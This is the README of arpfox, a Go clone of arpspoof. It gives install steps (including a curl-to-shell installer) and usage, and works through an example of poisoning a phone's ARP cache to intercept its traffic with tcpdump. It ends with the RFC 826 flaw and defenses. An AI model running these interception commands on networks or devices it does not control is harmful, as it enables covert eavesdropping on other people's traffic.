# arpfox

[![Build Status](https://travis-ci.org/malfunkt/arpfox.svg?branch=master)](https://travis-ci.org/malfunkt/arpfox)

`arpfox` is an [arpspoof](http://linux.die.net/man/8/arpspoof) clone written in
Go which creates and injects special [ARP
packets](https://en.wikipedia.org/wiki/Address_Resolution_Protocol#Packet_structure)
that can be used to poison
[ARP](https://en.wikipedia.org/wiki/Address_Resolution_Protocol) cache tables.

A security researcher can run `arpfox` against any machine on the LAN to pose
as any other host, this is an [ancient
technique](http://insecure.org/sploits/arp.games.html) known as [ARP
spoofing](https://en.wikipedia.org/wiki/ARP_spoofing) and is commonly used to
eavesdrop communications on a LAN.

The machine that receives traffic can record, censor, alter or selectively drop
network packets that pass through it.

## Get `arpfox`

You can install arpfox to `/usr/local/bin` with the following command (requires
admin privileges):

```
curl -sL 'https://raw.githubusercontent.com/malfunkt/arpfox/master/install.sh' | sh
```

You can also grab the latest release from our [releases
page](https://github.com/malfunkt/arpfox/releases) and install it manually into
another location.

## Build it yourself

In order to build `arpfox` you'll need Go, a C compiler and libpcap's
development files:

```
# Fedora
sudo dnf install -y libpcap-devel

# Debian/Ubuntu
sudo apt-get install -y libpcap-dev

# OSX
brew install libpcap

# FreeBSD
sudo pkg install libpcap

# Windows
You need install Winpacp
```

After installing libpcap, use `go get` to build and install `arpfox`:

```
go get github.com/malfunkt/arpfox
arpfox -h
```

## Running `arpfox`

```
arpfox -i [interface] -t [target] [host]
```

### Interface (-i)

Interface name, could be `eth0`, `en0`, `wlan0`, etc.

### Target specification (-t)

`arpfox` takes targets in the same format as `nmap`. The following are all
valid target specifications:

* `10.0.0.1`
* `10.0.0.0/24`
* `10.0.0.*`
* `10.0.0.1-10`
* `10.0.0.1, 10.0.0.5-10, 192.168.1.*, 192.168.10.0/24`

### Host

The host parameter defines the host you want to pose as, for instance, if you
use the LAN router's IP address, the target will start sending packets to you
intead of to the legitimate router.

### Root privileges

Depending on your OS, you may require root privileges to run `arpfox`

```
arpfox -i wlan0 -t 10.0.0.25 10.0.0.1
2016/09/05 20:06:12 wlan0: You don't have permission to capture on that device ((cannot open device) /dev/bpf: Permission denied)

sudo arpfox -i wlan0 -t 10.0.0.25 10.0.0.1
...
```

## A practical example

Alice is a security researcher, and she wants to intercept and record all
traffic between her own phone and the LAN router.

Her machine is already on the same LAN as the phone, and she knows the IP
addresses of both the phone and of the router.

```
Phone:  10.0.0.101
Router: 10.0.0.1
```

Alice will attempt to make her laptop pose as the router in order for the phone
to send all its traffic to the laptop.

If she succeeds, the phone will start sending traffic marked for `10.0.0.1` to
Alice's machine, which will just ignore the packets because these packets have
a different destination, in order to instruct the laptop to forward the packets
to the legitimate destination instrad of dropping them, Alice does something
like:

```
# OSX
sudo sysctl net.inet.ip.forwarding=1

# FreeBSD
sudo sysctl -w net.inet.ip.forwarding=1

# Linux
sudo sysctl -w net.ipv4.ip_forward=1
```

Besides forwarding, Alice also wants to see what's going on with unencrypted
traffic, so she instructs `tcpdump` to display packets coming from the phone:

```
tcpdump -i en0 -A -n "src host 10.0.0.101 and (dst port 80 or dst port 443)"
```

At this point Alice hasn't started `arpfox` yet and the phone's ARP table still
looks like this:

```
# 10.0.0.1's legitimate MAC address on the phone.
? (10.0.0.1) at 11:22:33:44:55:66 on wlan0 expires in 857 seconds [ethernet]
```

Now she's ready to use `arpfox`:

```
# arpfox -i [network interface] -t [target] [host]
arpfox -i en0 -t 10.0.0.101 10.0.0.1
```

`-i en0` tells `arpfox` to use the `en0` network interface and `-t 10.0.0.101
10.0.0.1` tells `arpfox` to send unsolicited ARP replies to the phone
(`10.0.0.101`) posing as the router (`10.0.0.1`).

After a few seconds, the phone's ARP table will get altered and the phone will
think Alice's machine is the router:

```
# 10.0.0.1's MAC address was changed on the phone.
? (10.0.0.1) at 11:22:de:ad:be:ef on wlan0 expires in 1193 seconds [ethernet]
```

Finally, she takes the phone and goes to `example.com`, `tcpdump` starts
showing traffic:

```
...
GET / HTTP/1.1
Host: example.org
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_5 like Mac OS X) AppleWebKit/601.1 (KHTML, like Gecko) CriOS/52.0.2743.84 Mobile/13G36 Safari/601.1.46
Accept-Language: en-us
Cache-Control: max-age=0
Connection: keep-alive
...
```

## Why does this happen?

[ARP](https://en.wikipedia.org/wiki/Address_Resolution_Protocol) is the
protocol most computers use to translate a [MAC
address](https://en.wikipedia.org/wiki/MAC_address) into an [IP address
](https://en.wikipedia.org/wiki/IP_address). The original proposal is described
in [RFC826](https://tools.ietf.org/html/rfc826).

The part that is flawed is described in the "Packet Reception" section:

> Notice that the <protocol type, sender protocol address, sender
> hardware address> triplet is merged into the table before the
> opcode is looked at.  This is on the assumption that communcation
> is bidirectional; if A has some reason to talk to B, then B will
> probably have some reason to talk to A.  Notice also that if an
> entry already exists for the <protocol type, sender protocol
> address> pair, then the new hardware address supersedes the old
> one.  Related Issues gives some motivation for this.

The opcode they're talking about is what tells the receiver if the packet is a
request or a reply, except that nothing verifies that a reply is associated
with a request nor that a request was made in the first place.

It only takes an unsolicited ARP packet of type reply to make a machine change
that entry into its internal ARP table, this includes adding new addreses and
replacing old ones.

## How can I protect against this?

There are [some programs](https://en.wikipedia.org/wiki/ARP_spoofing#Defense)
that can help you against ARP spoofing. Sometimes programs like these may be
inconvenient because we usually roam over different networks all the time and
these programs require usto hack stuff before actually starting being
productive. Keeping an static ARP table is simply not practical enough for most
users.

One thing you can do, though, is assuming things like these could happen and
try to encrypt your communications, specially on untrusted networks where any
node, even the router, can be actively recording traffic without your consent.
While this doesn't prevent attackers from keeping records on your
communications, it does prevent them from knowing the actual contents of it.

You don't have to use a VPN to stay secure, you can build a proxy with SSH and
configure your programs to use it:

```
ssh -D 9999 user@myownserver.org
```

## A glimpse of our future

You know what is probably not going to help solving this problem in the coming
years? Millions of already deployed IoT devices that cannot update themselves.
